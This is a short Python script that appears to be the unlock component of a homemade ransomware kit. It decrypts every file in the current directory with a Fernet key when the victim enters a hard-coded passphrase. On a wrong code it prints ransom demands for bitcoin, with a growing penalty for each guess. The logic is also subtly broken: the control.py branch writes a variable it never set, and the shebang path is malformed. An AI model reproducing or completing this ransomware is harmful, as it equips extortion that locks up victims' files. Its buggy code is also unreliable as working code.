#!usr/bin/env python3

# Author yxp5 >:)

import os
import time
from cryptography.fernet import Fernet

files = []
skipped = ["malware.py"]

for file in os.listdir():
	if file in skipped: continue
	else: files.append(file)

usercode = input("Enter the code: ")
realcode = "MAGA for the win"
ckeyfile = open("ckey.key", "rb")
ckey = ckeyfile.read()

if usercode == realcode:
	print("Good... I hope you learned your lesson.\n")
	time.sleep(1)
	for file in files:
		print(f"Decrypting {file}...\n")
		fp = open(file, "rb")
		content = fp.read()
		if file == "control.py":
			encryption = Fernet(ckey).encrypt(content)
		else:
			decryption = Fernet(ckey).decrypt(content)
		
		fp = open(file, "wb")
		fp.write(decryption)
		time.sleep(1)
else:
	print("Wrong code! You need to pay me bitcoin to get code\n")
	time.sleep(1)
	print("For each wrong input, you need to pay me 1 more bitcoin for trying to guess the code!\n")
	exit()

print("Control released!\n")
time.sleep(1)
print("Now run the recover.py script to get your files back!\n")

